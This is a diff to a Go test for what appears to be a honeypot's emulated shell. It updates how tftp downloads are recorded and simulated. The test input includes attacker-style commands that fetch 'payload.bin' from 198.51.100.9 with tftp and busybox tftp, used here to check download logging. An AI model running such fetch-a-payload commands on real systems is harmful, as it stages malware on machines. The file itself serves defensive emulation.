@@ -87,12 +87,21 @@ func TestTftpFtpget(t *testing.T) {
 	var got []Download
 	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
 	run(t, in, s, "cd /tmp")
-	run(t, in, s, "tftp -g -r payload.bin 198.51.100.9")
+	// Ubuntu has no tftp on $PATH, only busybox's applet: by name it is not
+	// found, but the URL is still recorded.
+	_, errb, st := run(t, in, s, "tftp -g -r payload.bin 198.51.100.9")
+	if st != 127 || !strings.Contains(errb, "tftp: command not found") {
+		t.Errorf("tftp by name: exit %d, stderr %q", st, errb)
+	}
 	if len(got) != 1 || got[0].Tool != "tftp" || !strings.Contains(got[0].URL, "payload.bin") {
 		t.Fatalf("tftp = %+v", got)
 	}
-	if !s.FS.Exists("/tmp/payload.bin") {
-		t.Error("tftp payload not dropped")
+	if s.FS.Exists("/tmp/payload.bin") {
+		t.Error("a tool that is not installed dropped a payload")
+	}
+	run(t, in, s, "busybox tftp -g -r payload.bin 198.51.100.9")
+	if len(got) != 2 || !s.FS.Exists("/tmp/payload.bin") {
+		t.Errorf("busybox tftp: downloads %+v, payload exists %v", got, s.FS.Exists("/tmp/payload.bin"))
 	}
 }
 
